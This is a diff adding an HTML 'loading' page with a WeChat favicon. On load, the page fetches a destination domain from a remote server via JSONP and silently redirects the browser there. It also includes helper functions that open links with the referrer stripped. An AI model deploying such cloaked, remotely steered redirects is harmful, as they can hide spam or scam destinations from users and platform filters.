@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <link href='http://res.wx.qq.com/mpres/htmledition/images/favicon218877.ico' rel='Shortcut Icon'>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>loading</title>
+    <script type=text/javascript src="https://libs.baidu.com/jquery/1.9.0/jquery.min.js"></script>
+    <style>
+        iframe{display: none;}
+    </style>
+</head>
+<body>
+<script type="text/javascript">
+    $(function () {
+        get_share();
+    });
+    var u = navigator.userAgent;
+    function is_ios() {
+        if(!!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)){
+            return true;
+        }else{
+            return false;
+        }
+    }
+    function get_share(){
+		var url = "http://hd.antelun.com/index.php/geturl/getRedurl";
+        if(is_ios()){
+        	 var url = "https://hd.antelun.com/index.php/geturl/getRedurl";
+        }
+        $.ajax({
+            type: "get",
+            async: false,
+            url:url,
+            dataType: "jsonp",
+            jsonp: "callback",
+            jsonpCallback:"checkHandler",
+            success: function(data){
+            	var d = data.url;
+            	window.location.href="http://"+d+"/index.php/share/nindex";
+            }
+        });
+    }
+    function open_without_referrer(link){
+        document.body.appendChild(document.createElement('iframe')).src='javascript:"<script>top.location.replace(\''+link+'\')<\/script>"';
+    }
+    function open_new_window(full_link){
+        window.open('javascript:window.name;', '<script>location.replace("'+full_link+'")<\/script>');
+    }
+    function getQueryString(name) {
+        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+        var r = window.location.search.substr(1).match(reg);
+        if (r != null) return unescape(r[2]);
+        return null;
+    }
+</script>
+</body>
+</html>
